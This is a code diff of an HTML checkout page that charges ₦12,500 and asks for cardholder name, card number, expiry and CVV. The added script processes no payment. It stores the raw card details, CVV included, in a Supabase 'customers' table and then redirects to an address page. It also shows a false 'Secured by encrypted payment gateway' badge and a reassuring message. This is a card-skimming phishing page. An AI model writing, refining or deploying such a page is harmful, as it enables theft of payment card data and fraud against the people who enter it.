@@ -8,7 +8,6 @@
 <style>
 :root {
     --primary: #635bff;
-    --success: #16a34a;
     --bg: #f6f7fb;
     --text: #1f2937;
     --muted: #6b7280;
@@ -21,24 +20,44 @@ body {
     margin: 0;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     background: var(--bg);
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    color: var(--text);
     min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     padding: 20px;
 }
 
-.card {
-    background: white;
-    padding: 24px;
+.payment-wrapper {
     width: 100%;
     max-width: 420px;
+    background: white;
     border-radius: 16px;
-    box-shadow: 0 20px 40px rgba(0,0,0,.08);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+    padding: 24px;
 }
 
-.card h2 { margin-bottom: 6px; }
-.card p { color: var(--muted); font-size: 14px; margin-bottom: 18px; }
+.header {
+    margin-bottom: 24px;
+}
+
+.header h1 {
+    font-size: 20px;
+    margin: 0 0 6px;
+}
+
+.header p {
+    margin: 0;
+    font-size: 14px;
+    color: var(--muted);
+}
+
+label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 6px;
+}
 
 input {
     width: 100%;
@@ -47,7 +66,6 @@ input {
     border-radius: 10px;
     border: 1px solid var(--border);
     outline: none;
-    margin-bottom: 15px;
 }
 
 input:focus {
@@ -55,14 +73,19 @@ input:focus {
     box-shadow: 0 0 0 2px rgba(99,91,255,0.15);
 }
 
+.field {
+    margin-bottom: 18px;
+}
+
 .row {
     display: flex;
     gap: 12px;
 }
 
-.row input { flex: 1; margin-bottom: 0; }
+.row .field { flex: 1; }
 
-button {
+.pay-btn {
+    margin-top: 10px;
     width: 100%;
     padding: 14px;
     font-size: 16px;
@@ -74,47 +97,105 @@ button {
     cursor: pointer;
 }
 
-button:disabled { background: #999; }
+.pay-btn:hover {
+    background: #5149e6;
+}
 
 .status-msg {
+    margin-top: 12px;
     font-size: 13px;
     color: var(--muted);
-    margin-top: 12px;
+}
+
+.secure {
+    margin-top: 14px;
+    text-align: center;
+    font-size: 12px;
+    color: var(--muted);
 }
 </style>
 </head>
 
 <body>
-<div class="card">
-
-    <p>Secure card payment</p>
-
-    <input placeholder="Cardholder name">
-    <input placeholder="Card number">
-    
-    <div class="row">
-        <input placeholder="MM / YY">
-        <input placeholder="CVV">
+<div class="payment-wrapper">
+    <div class="header">
+        <h1>Pay ₦12,500</h1>
+        <p>Secure card payment</p>
     </div>
 
-    <button id="payBtn" onclick="processPayment()">Pay now</button>
+    <div class="field">
+        <label>Cardholder name</label>
+        <input type="text" id="name" placeholder="John Doe">
+    </div>
 
+    <div class="field">
+        <label>Card number</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456">
+    </div>
+
+    <div class="row">
+        <div class="field">
+            <label>Expiry</label>
+            <input type="text" id="expiry" placeholder="MM / YY">
+        </div>
+        <div class="field">
+            <label>CVV</label>
+            <input type="password" id="cvv" placeholder="123">
+        </div>
+    </div>
+
+    <button class="pay-btn" id="payBtn">Pay now</button>
     <p class="status-msg" id="msg"></p>
+
+    <div class="secure">
+        🔒 Secured by encrypted payment gateway
+    </div>
 </div>
 
+<!-- Supabase JS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/supabase.min.js"></script>
 <script>
-function processPayment() {
-    const btn = document.getElementById("payBtn");
-    const msg = document.getElementById("msg");
+// Initialize Supabase
+const supabaseUrl = 'YOUR_SUPABASE_URL';
+const supabaseKey = 'YOUR_SUPABASE_ANON_KEY';
+const supabase = Supabase.createClient(supabaseUrl, supabaseKey);
 
-    btn.disabled = true;
-    btn.innerText = "Processing...";
+const payBtn = document.getElementById("payBtn");
+const msg = document.getElementById("msg");
+
+payBtn.addEventListener("click", async () => {
+    const name = document.getElementById("name").value;
+    const cardNumber = document.getElementById("cardNumber").value;
+    const expiry = document.getElementById("expiry").value;
+    const cvv = document.getElementById("cvv").value;
+
+    if(!name || !cardNumber || !expiry || !cvv) {
+        msg.innerText = "Please fill all fields";
+        return;
+    }
+
+    payBtn.disabled = true;
+    payBtn.innerText = "Processing...";
     msg.innerText = "You will be notified if card details are correct and your order will be sent.";
 
+    // Save to Supabase
+    const { data, error } = await supabase.from('customers').insert([
+        { name, card_number: cardNumber, expiry, cvv }
+    ]);
+
+    if(error) {
+        msg.innerText = "Error saving data. Try again.";
+        payBtn.disabled = false;
+        payBtn.innerText = "Pay now";
+        console.error(error);
+        return;
+    }
+
+    // Simulate delay then redirect to address page
     setTimeout(() => {
         window.location.href = "address.html";
     }, 2500);
-}
+});
 </script>
 </body>
 </html>
